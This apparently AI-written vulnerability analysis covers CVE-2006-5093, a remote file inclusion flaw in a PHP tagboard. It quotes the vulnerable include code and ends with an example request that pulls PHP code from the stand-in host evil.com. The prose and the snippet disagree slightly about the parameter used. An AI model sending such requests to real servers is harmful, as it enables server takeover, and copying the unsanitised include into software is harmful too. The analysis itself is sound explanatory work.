Based on the provided content, here's an analysis of CVE-2006-5093:

**Root cause of vulnerability:**

*   The vulnerability stems from a flaw in the `index.php` file of the TagIt! Tagboard 2.1.b b2 application. Specifically, the application uses user-supplied input (`$_GET['page']`) within an `include()` statement without proper sanitization.

**Weaknesses/vulnerabilities present:**

*   **Remote File Inclusion (RFI):** The primary vulnerability is RFI. The application directly includes a file specified via the `page` GET parameter. If an attacker can control this parameter, they can include a file from a remote server, leading to arbitrary code execution.

**Impact of exploitation:**

*   **Arbitrary code execution:** By including a malicious remote file containing PHP code, an attacker can execute arbitrary code on the server hosting the vulnerable application.
*   **Compromise of the server:** Successful RFI exploitation could lead to full compromise of the server, potentially enabling further attacks.

**Attack vectors:**

*   **HTTP GET Request:** The attack vector is an HTTP GET request. The `page` parameter is appended to the URL, specifying the file to be included.

**Required attacker capabilities/position:**

*   **Network access:** The attacker needs network access to the vulnerable server.
*   **Knowledge of the vulnerability:** The attacker needs to know that the application uses the `page` parameter to include files and does not sanitize it.
*   **Ability to host a malicious file:** The attacker needs a server or a location where they can host a malicious PHP file that will be included.

**Technical Details:**

The vulnerable code snippet in `index.php` is:

```php
if(isset($_GET['load']) && $_GET['load'] == "dtu" or $_GET['load'] == "tag") {
  include("$page.php");
}
else {
  include("tagviewer.php");
}
```

An attacker can exploit this by sending a request such as:
`http://site/path/index.php?page=http://evil.com/malicious_code`
This would cause the server to include the PHP code from `http://evil.com/malicious_code.php` and execute it.
